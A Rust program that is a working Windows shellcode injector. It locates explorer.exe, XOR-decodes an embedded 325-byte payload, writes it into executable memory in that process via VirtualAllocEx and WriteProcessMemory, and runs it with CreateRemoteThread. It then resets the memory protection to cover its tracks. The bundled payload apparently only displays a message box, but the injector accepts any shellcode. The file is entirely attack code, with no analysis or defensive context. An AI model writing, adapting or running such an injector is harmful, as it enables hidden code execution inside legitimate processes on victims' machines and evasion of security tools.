extern crate winapi;
use std::ptr::null_mut;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread, FlushInstructionCache};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{HANDLE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, TH32CS_SNAPPROCESS, PROCESSENTRY32};
use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::ctypes::c_void;
fn xordec(shellcode: &[u8], key: u8) -> Vec<u8> {
    shellcode.iter().map(|&byte| byte ^ key).collect()
}
fn xplr_find() -> Option<DWORD> {
    unsafe {
        let snapshot: HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == null_mut() {
            return None;
        }
        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) == FALSE {
            CloseHandle(snapshot);
            return None;
        }
        loop {
            let exe_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr());
            if exe_name.to_str().unwrap().eq_ignore_ascii_case("explorer.exe") {
                CloseHandle(snapshot);
                return Some(entry.th32ProcessID);
            }

            if Process32Next(snapshot, &mut entry) == FALSE {
                break;
            }
        }
        CloseHandle(snapshot);
        None
    }
}

fn shellinj(pid: DWORD, shellcode: &[u8]) -> Result<(), String> {
    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if process == null_mut() {
            return Err("Handle err.".into());
        }
        let alloc = VirtualAllocEx(process, null_mut(), shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if alloc == null_mut() {
            CloseHandle(process);
            return Err("Memalloc err.".into());
        }
        if WriteProcessMemory(process, alloc, shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut()) == FALSE {
            CloseHandle(process);
            return Err("Shell injection err.".into());
        }
        FlushInstructionCache(process, alloc, shellcode.len());
        let thread = CreateRemoteThread(process, null_mut(), 0, Some(std::mem::transmute(alloc)), null_mut(), 0, null_mut());
        if thread == null_mut() {
            CloseHandle(process);
            return Err("Remote thread createion err.".into());
        }
        use winapi::um::synchapi::WaitForSingleObject;
        let wait_time_ms = 500;
        WaitForSingleObject(thread, wait_time_ms);
        // Revert memprot
        let mut old_protect: DWORD = 0;
        if VirtualProtectEx(process, alloc, shellcode.len(), PAGE_READWRITE, &mut old_protect) == FALSE {
            CloseHandle(thread);
            CloseHandle(process);
            return Err("Memprot reverse err.".into());
        }
        CloseHandle(thread);
        CloseHandle(process);
    }

    Ok(())
}
fn main() {
    let pid = match xplr_find() {
        Some(pid) => pid,
        None => {
            println!("Failed to find explorer.exe process");
            return;
        }
    };
    //Shellcode Payload
    let xorenc_shell: [u8; 325] = [0x56, 0xe2, 0x2b, 0x4e, 0x5a, 0x55, 0x55, 0x55, 0x42, 0x7a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0x94, 0xe2, 0x21, 0xf8, 0xb2, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0xe2, 0x21, 0xd8, 0xfa, 0x94, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x94, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xc5, 0xe2, 0xab, 0x7a, 0xfa, 0x94, 0x21, 0xe2, 0xb2, 0x94, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xf6, 0xe2, 0x55, 0x63, 0x94, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0x94, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x7c, 0xf2, 0x94, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0x94, 0xeb, 0x21, 0xa6, 0xe2, 0x94, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0x94, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0x94, 0xe2, 0x21, 0xb8, 0x43, 0xe3, 0x55, 0x55, 0x55, 0xf7, 0x94, 0xe2, 0x27, 0x27, 0x87, 0xab, 0xaa, 0xaa, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe3, 0x6d, 0x6b, 0xaa, 0xaa, 0xaa, 0xaa, 0x94, 0xe2, 0x27, 0x3f, 0xa4, 0xab, 0xaa, 0xaa, 0x94, 0xe6, 0x27, 0x2f, 0x88, 0xab, 0xaa, 0xaa, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0xef, 0x29, 0xfc, 0xad, 0x55, 0x7f, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0x5a, 0x1f, 0x08, 0xfc, 0x55, 0x7f, 0xed, 0xc3, 0xde, 0xc2, 0xdf, 0xc8, 0x84, 0xc9, 0xc5, 0xc7, 0x85, 0xe8, 0xd8, 0xcf, 0xc4, 0xde, 0xc6, 0xd3, 0xdd, 0xaa, 0xe7, 0xcf, 0xd9, 0xd9, 0xcb, 0xcd, 0xcf, 0xe8, 0xc5, 0xd2, 0xaa, 0xdf, 0xd9, 0xcf, 0xd8, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0xaa];
    let key = 0xaa;
    let xordec_shell = xordec(&xorenc_shell, key);
    match shellinj(pid, &xordec_shell) {
        Ok(_) => println!("Success."),
        Err(e) => println!("Failed: {}", e),
    }
}
